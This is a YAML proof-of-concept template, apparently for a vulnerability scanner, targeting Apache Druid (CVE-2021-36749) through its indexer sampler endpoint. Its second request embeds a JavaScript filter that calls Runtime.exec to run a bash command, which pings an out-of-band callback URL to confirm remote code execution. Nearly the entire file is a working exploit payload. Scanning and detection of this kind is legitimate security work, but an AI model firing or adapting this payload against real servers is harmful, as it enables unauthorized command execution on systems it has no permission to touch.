name: poc-yaml-apache-druid-cve-2021-36749-rce
manual: true
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules: 
  druid1:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}}},"samplerConfig":{"numRows":500}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"cacheKey")
  druid2:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=filter
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type": "javascript",
          "function": "function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 ping {{reverseURL}} 0>&1')}",
          "dimension": "added",
          "": {
            "enabled": "true"
          }}}}},"samplerConfig":{"numRows":500,"cacheKey":"adbb9836f7f44069b0532f98c031406a"}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"cacheKey")
expression: druid1() && druid2()
detail:
    author: iak3ec(https://github.com/nu0l)
    links:
      - https://mp.weixin.qq.com/s/Fl2hSO-y60VsTi5YJFyl0w